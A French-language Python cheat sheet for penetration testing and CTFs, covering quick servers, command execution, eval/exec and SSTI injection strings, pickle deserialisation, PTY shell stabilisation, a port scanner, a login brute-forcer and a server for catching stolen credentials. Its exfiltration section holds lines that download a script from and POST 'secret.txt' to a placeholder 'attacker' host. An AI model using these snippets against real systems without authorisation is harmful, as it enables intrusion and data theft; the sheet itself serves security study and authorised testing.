# Python — Outil

> Aide-mémoire Python pour le pentest et les CTF : serveurs rapides, exécution de commandes, scripts de post-exploitation et one-liners utiles.

---

## Présentation

Python est disponible sur la quasi-totalité des cibles Linux et sert en pentest à monter rapidement un serveur (exfiltration, transfert de fichiers), exécuter des commandes système, écrire des scripts de scan/brute-force ad hoc, ou injecter du code dans une application vulnérable (SSTI, `eval`/`exec`, désérialisation).

**Note sur `sys.path`** : l'ordre de recherche des modules est le répertoire du script lui-même, puis `PYTHONPATH`, puis les dossiers standards (`/usr/lib/python3/...`).
```bash
python3 --version
python3 -c "import sys; print(sys.path)"
```

## Utilisation de base

### Lancement de serveurs

```bash
python3 -m http.server 8000
python3 -m http.server 8000 --directory /tmp/loot   # sert un dossier précis sans s'y déplacer
python3 -m http.server 8000 --bind 127.0.0.1        # écoute locale uniquement (via tunnel/pivot)
```
> Démarre un serveur HTTP local sur le port 8000 (exfiltration, transfert de fichiers).

```bash
python3 -m smtpd -c DebuggingServer -n localhost:1025
```
> Lance un serveur SMTP local (utile en test d'email spoofing).

### Exécution de commandes

```python
import os
os.system("id")
```
> Exécute une commande système.

```python
import subprocess
subprocess.call(["ls", "-la"])
```
> Exécution plus fine de commandes.

```python
eval("__import__('os').system('id')")
```
> Exemple d'injection dans un `eval()` vulnérable.

```python
exec("__import__('os').system('whoami')")
```
> Variante d'exécution arbitraire via `exec()`.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
> Spawn un PTY interactif — première étape de stabilisation d'un shell (détail complet des étapes suivantes : `reverse_shells.md`).

```python
pickle.loads(payload)
```
> Chargement de données via Pickle — permet l'exécution de code arbitraire si le flux n'est pas fiable (utile pour construire un payload de désérialisation).

### Gestion d'environnement (venv / outillage pentest)

```bash
# Isoler les dépendances d'un outil offensif (évite de casser les paquets système)
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
deactivate

# pipx — installer un outil CLI Python dans son propre venv, binaire dispo globalement
pipx install impacket
pipx run some-tool
```
> Utile pour cloner/installer des outils GitHub (souvent des dépendances contradictoires) sans polluer l'environnement système, notamment sur une Kali partagée.

## Cas d'usage avancés / Techniques

### Scripts de post-exploitation

**Serveur simple pour voler des creds (ex: LFI)**
```python
from http.server import BaseHTTPRequestHandler, HTTPServer
class Handler(BaseHTTPRequestHandler):
  def do_GET(self):
    print(self.path)
    self.send_response(200)
    self.end_headers()
    self.wfile.write(b"OK")

HTTPServer(("0.0.0.0",8000), Handler).serve_forever()
```
> Enregistre tout ce qui est demandé, très utile en LFI.

### Analyse et bruteforce

**Scanner de ports simple**
```python
import socket
for port in range(1,1025):
  s = socket.socket()
  s.settimeout(0.5)
  result = s.connect_ex(("127.0.0.1", port))
  if result == 0:
    print(f"Port {port} ouvert")
  s.close()
```

**Brute force simple**
```python
import requests
for pwd in ["admin", "1234", "password"]:
  r = requests.post("http://target/login", data={"user":"admin", "pass":pwd})
  if "Welcome" in r.text:
    print("Mot de passe trouvé :", pwd)
```

### Téléchargement et exfiltration de fichiers

**Télécharger un fichier via HTTP**
```python
import urllib.request
urllib.request.urlretrieve("http://attacker/file.sh", "file.sh")
```

**Exfiltration d'un fichier**
```python
import requests
f = open("secret.txt", "rb")
r = requests.post("http://attacker/upload", files={"file": f})
```

### Hash / Encodage

```python
import base64
base64.b64encode(b"admin")
```
> Encode une chaîne en Base64.

```python
import hashlib
hashlib.md5(b"admin").hexdigest()
```
> Hash MD5 d'une chaîne (identification/cracking : voir `hashing.md`).

### Librairies à connaître

| Librairie | Usage |
|---|---|
| `requests` | Requêtes HTTP (bruteforce, SSRF, etc.) |
| `urllib` | Requêtes simples (moins puissant que requests) |
| `os` / `subprocess` | Exécution de commandes |
| `socket` | Réseaux (recon, shells, serveurs) |
| `base64` | Encodage/décodage |
| `hashlib` | Génération de hash (cracking) |
| `json` | Lecture de fichiers config/API |
| `pickle` | (Dé)sérialisation — vecteur d'exécution de code si non fiable |

## Astuces

```python
__import__('os').system('whoami')
```
> Utile si on peut injecter du code Python dans une appli (SSTI, etc.).

```python
type(variable), dir(variable), help(variable)
```
> Très pratique en reverse engineering ou debug dans un environnement inconnu.

## Ressources

- Documentation officielle : https://docs.python.org/3/
- PayloadsAllTheThings : https://github.com/swisskyrepo/PayloadsAllTheThings
